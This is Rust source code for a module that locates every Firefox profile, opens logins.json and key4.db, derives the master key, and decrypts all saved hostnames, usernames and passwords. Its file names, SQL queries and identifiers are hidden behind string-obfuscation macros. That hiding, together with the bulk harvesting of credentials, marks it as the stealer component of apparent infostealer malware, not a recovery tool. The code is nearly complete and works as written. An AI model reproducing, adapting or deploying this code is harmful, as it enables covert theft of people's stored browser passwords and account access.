use std::{
    fs::{self, DirEntry},
    num::NonZeroU32,
    path::Path,
};

use crate::browser::Login;

use obfstr::{obfbytes, obfstr};
use serde_json;

use aes::{
    cipher::{
        block_padding::Pkcs7,
        generic_array::GenericArray,
        typenum::{self},
        BlockDecryptMut, KeyIvInit,
    },
    Aes256,
};
use base64::prelude::*;
use cbc::Decryptor;
use der_parser::ber;
use des::TdesEde3;
use ring::pbkdf2::PBKDF2_HMAC_SHA256;
use sha1::{Digest, Sha1};

use rusqlite::Connection;

type Aes256CbcDec = Decryptor<Aes256>;
type TripleDesCbcDec = Decryptor<TdesEde3>;

pub fn get_creds_fox(path: &Path) -> Option<Vec<Login>> {
    let mut creds: Vec<Login> = Vec::new();
    for profile in path.read_dir().ok()? {
        if let Some(cred) = get_creds_from_profile(profile.ok()?) {
            creds.extend(cred);
        }
    }
    if creds.is_empty() {
        return None;
    }
    Some(creds)
}

fn decrypt(cred: &str, key: &[u8]) -> Option<String> {
    let cred1 = BASE64_STANDARD.decode(cred).ok()?;
    let (_, cred2) = ber::parse_ber(&cred1).ok()?;
    if cred2[1][0].as_oid().ok()?.to_id_string() == obfstr!("1.2.840.113549.3.7") {
        let iv = cred2[1][1].as_slice().ok()?;
        let iv_generic_array = GenericArray::clone_from_slice(&iv);
        let key_generic_array = GenericArray::clone_from_slice(&key[0..24]);
        let enc_data = cred2[2].as_slice().ok()?;

        let raw_clear_data = TripleDesCbcDec::new(&key_generic_array, &iv_generic_array)
            .decrypt_padded_vec_mut::<Pkcs7>(&enc_data)
            .ok()?;
        Some(String::from_utf8(raw_clear_data).ok()?)
    } else {
        return None;
    }
}

fn get_creds_from_profile(profile: DirEntry) -> Option<Vec<Login>> {
    let mut creds: Vec<Login> = Vec::new();
    let login_file = profile.path().join(obfstr!("logins.json"));
    if !login_file.is_file() {
        return None;
    }
    let data = fs::read_to_string(login_file).ok()?;
    let json: serde_json::Value = serde_json::from_str(&data).ok()?;

    let key_file = profile.path().join(obfstr!("key4.db"));

    let conn = Connection::open(key_file).ok()?;
    let mut row = conn
        .prepare(obfstr!(
            "SELECT item1, item2 FROM metadata WHERE id = 'password' LIMIT 1;"
        ))
        .ok()?;
    let (item1, item2) = row
        .query_row([], |row| {
            let item1: Vec<u8> = row.get(0)?;
            let item2: Vec<u8> = row.get(1)?;
            Ok((item1, item2))
        })
        .ok()?;
    let password = get_clear_value(&item2, &item1)?;
    if password != obfbytes!(b"password-check") {
        return None;
    }

    let mut row = conn
        .prepare(obfstr!("SELECT a11,a102 FROM nssPrivate LIMIT 1;"))
        .ok()?;

    let (a11, a102) = row
        .query_row([], |row| {
            let a11: Vec<u8> = row.get(0)?;
            let a102: Vec<u8> = row.get(1)?;
            Ok((a11, a102))
        })
        .ok()?;

    if a102 != obfbytes!(b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01") {
        return None;
    }
    let key = get_clear_value(&a11, &item1)?;
    for i in json[obfstr!("logins")].as_array()? {
        creds.push(Login {
            host: i[obfstr!("hostname")].as_str()?.to_string(),
            user: decrypt(&i[obfstr!("encryptedUsername")].as_str()?, &key)?,
            pass: decrypt(&i[obfstr!("encryptedPassword")].as_str()?, &key)?,
        })
    }
    return Some(creds);
}

fn get_clear_value(ber: &[u8], salt: &[u8]) -> Option<Vec<u8>> {
    let (_, decoded) = der_parser::der::parse_der(ber).ok()?;

    let algorithm = decoded[0][0].as_oid().ok()?.to_id_string();
    if algorithm == obfstr!("1.2.840.113549.1.5.13") {
        let entry_salt = decoded[0][1][0][1][0].as_slice().ok()?;
        let iteration_count = decoded[0][1][0][1][1].as_u32().ok()?;
        let key_length = decoded[0][1][0][1][2].as_u32().ok()?;
        let cipher_txt = decoded[1].as_slice().ok()?;
        let iv_body = decoded[0][1][1][1].as_slice().ok()?;

        if key_length == 32 {
            let mut k_hasher = Sha1::new();
            k_hasher.update(salt);

            // we know the key is 32 bytes in advance
            let mut key = vec![0u8; 32];

            let k = k_hasher.finalize();
            ring::pbkdf2::derive(
                PBKDF2_HMAC_SHA256,
                NonZeroU32::new(iteration_count)?,
                entry_salt,
                &k,
                &mut key,
            );
            let key_generic_array = GenericArray::from_slice(&key);

            let iv_header = [0x04, 0x0e];
            let mut iv = Vec::with_capacity(iv_header.len() + iv_body.len());
            iv.extend_from_slice(&iv_header);
            iv.extend_from_slice(iv_body);
            let iv_generic_array: GenericArray<u8, typenum::U16> =
                GenericArray::clone_from_slice(&iv);

            let value = Aes256CbcDec::new(&key_generic_array, &iv_generic_array)
                .decrypt_padded_vec_mut::<Pkcs7>(&cipher_txt)
                .ok()?;
            return Some(value);
        } else {
            return None;
        }
    } else {
        return None;
    }
}
